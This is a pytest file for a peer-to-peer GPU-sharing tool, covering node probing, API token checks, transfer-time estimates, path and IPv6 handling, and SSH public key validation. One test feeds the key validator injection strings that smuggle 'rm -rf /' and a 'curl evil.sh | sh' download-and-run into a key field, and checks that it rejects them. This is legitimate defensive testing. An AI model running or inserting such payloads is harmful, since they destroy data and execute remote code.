"""Phase 1 tests: probing, auth, and the projection maths."""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from p2pgpu.common.config import AUTH_HEADER, cluster_token
from p2pgpu.common.netbench import estimate_transfer_s, transfer_estimates
from p2pgpu.common.schema import GPUInfo, NodeCapabilities
from p2pgpu.worker.agent import app
from p2pgpu.worker.probe import probe

client = TestClient(app)


def test_probe_reports_a_backend():
    caps = probe()
    assert caps.backend in {"cuda", "mps", "rocm", "cpu"}
    assert caps.ram_total_mb > 0
    assert caps.node_id


def test_health_needs_no_token():
    resp = client.get("/health")
    assert resp.status_code == 200
    assert resp.json()["ok"] is True


def test_capabilities_rejects_missing_token():
    assert client.get("/v1/capabilities").status_code == 401


def test_capabilities_rejects_wrong_token():
    resp = client.get("/v1/capabilities", headers={AUTH_HEADER: "not-the-token"})
    assert resp.status_code == 401


@pytest.mark.skipif(cluster_token() is None, reason="no cluster token configured")
def test_capabilities_accepts_valid_token():
    resp = client.get("/v1/capabilities", headers={AUTH_HEADER: cluster_token()})
    assert resp.status_code == 200
    assert NodeCapabilities.model_validate(resp.json()).ram_total_mb > 0


def test_usable_vram_prefers_free_over_total():
    """Placement must plan against free VRAM, not the number on the box."""
    caps = NodeCapabilities(
        node_id="x",
        hostname="h",
        platform="p",
        arch="a",
        ram_total_mb=1,
        ram_free_mb=1,
        backend="cuda",
        agent_version="0",
        gpus=[
            GPUInfo(index=0, name="g", vendor="nvidia", total_memory_mb=16384, free_memory_mb=4096),
        ],
    )
    assert caps.total_vram_mb == 16384
    assert caps.usable_vram_mb == 4096


def test_transfer_estimate_matches_hand_calculation():
    # 100 MB at 40 Mbps = 100 * 8 / 40 = 20 s.
    assert estimate_transfer_s(100, 40) == pytest.approx(20.0)


def test_transfer_estimate_unknown_without_measurement():
    assert estimate_transfer_s(100, None) is None
    assert estimate_transfer_s(100, 0) is None


def test_transfer_table_reports_unknown_rather_than_lying():
    rows = transfer_estimates(upload_mbps=None, download_mbps=None)
    assert rows and all(human == "?" for _label, _size, human in rows)


def test_transfer_table_uses_the_right_direction():
    """Uploads must be priced with upload speed, downloads with download speed."""
    rows = dict((label, human) for label, _size, human in
                transfer_estimates(upload_mbps=8, download_mbps=800))
    # 1 GB up at 8 Mbps is slow; 5 GB down at 800 Mbps is fast.
    assert rows["push a 1 GB dataset"].endswith("min")
    assert rows["pull back a 5 GB fine-tuned model"].endswith("s")


def test_share_preflight_reports_problems_as_strings():
    """Preflight must return actionable text, never raise, on a machine with no GPU."""
    from p2pgpu.worker import share as sharing

    problems, warnings = sharing.preflight()
    assert isinstance(problems, list) and isinstance(warnings, list)
    assert all(isinstance(m, str) and m for m in problems + warnings)


def test_docker_mount_path_uses_forward_slashes():
    """Windows paths must not carry backslashes into a colon-separated -v arg."""
    from pathlib import PureWindowsPath

    from p2pgpu.worker.share import docker_mount_path

    rendered = docker_mount_path(PureWindowsPath(r"C:\Users\Bob\p2pgpu-workspace"))
    assert rendered == "C:/Users/Bob/p2pgpu-workspace"
    assert "\\" not in rendered


def test_tailscale_lookup_never_raises_when_absent():
    """A missing Tailscale must degrade to None, not blow up the CLI."""
    from p2pgpu.worker.share import tailscale_exe, tailscale_ip

    assert tailscale_exe() is None or isinstance(tailscale_exe(), str)
    assert tailscale_ip() is None or isinstance(tailscale_ip(), str)


def test_ipv6_literals_are_bracketed_for_docker_and_urls():
    """A bare IPv6 address next to a :port is ambiguous; RFC 3986 brackets fix it."""
    from p2pgpu.worker.share import bracket_host, is_ipv6

    assert is_ipv6("fd7a:115c:a1e0::e801:f4bb")
    assert bracket_host("fd7a:115c:a1e0::e801:f4bb") == "[fd7a:115c:a1e0::e801:f4bb]"
    # Already-bracketed input must not be double-wrapped.
    assert bracket_host("[fd7a:115c::1]") == "[fd7a:115c::1]"


def test_ipv4_and_hostnames_are_left_alone():
    from p2pgpu.worker.share import bracket_host, is_ipv6

    assert not is_ipv6("100.65.244.36")
    assert bracket_host("100.65.244.36") == "100.65.244.36"
    assert bracket_host("0.0.0.0") == "0.0.0.0"
    assert bracket_host("localhost") == "localhost"


# --- SSH key validation ----------------------------------------------------


def test_valid_ssh_keys_accepted():
    from p2pgpu.worker.share import validate_ssh_key

    ed = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII8HDsuCiiCPypS+AgQVHLhvOElLMgAdv0o4P0RXsDN9 shiva"
    assert validate_ssh_key(ed) == ed
    # No comment is still valid.
    assert validate_ssh_key("ssh-rsa AAAAB3NzaC1yc2EAAAA==") == "ssh-rsa AAAAB3NzaC1yc2EAAAA=="


def test_ssh_key_injection_is_rejected():
    """The key is interpolated into the container's shell script -- quotes must not pass."""
    import pytest as _pytest

    from p2pgpu.worker.share import ShareError, validate_ssh_key

    for evil in [
        "ssh-ed25519 AAAA' ; rm -rf / ; echo '",
        'ssh-ed25519 AAAA" ; curl evil.sh | sh ; "',
        "ssh-ed25519 AAAA\\nrm -rf /",
        "ssh-ed25519 AAAA\nssh-rsa BBBB",
    ]:
        with _pytest.raises(ShareError):
            validate_ssh_key(evil)


def test_private_key_gets_a_specific_warning():
    """People paste the wrong file. Say so plainly rather than 'invalid key'."""
    import pytest as _pytest

    from p2pgpu.worker.share import ShareError, validate_ssh_key

    with _pytest.raises(ShareError, match="PRIVATE"):
        validate_ssh_key("-----BEGIN OPENSSH PRIVATE KEY-----")


def test_garbage_rejected():
    import pytest as _pytest

    from p2pgpu.worker.share import ShareError, validate_ssh_key

    for junk in ["", "hello world", "not-a-key AAAA"]:
        with _pytest.raises(ShareError):
            validate_ssh_key(junk)
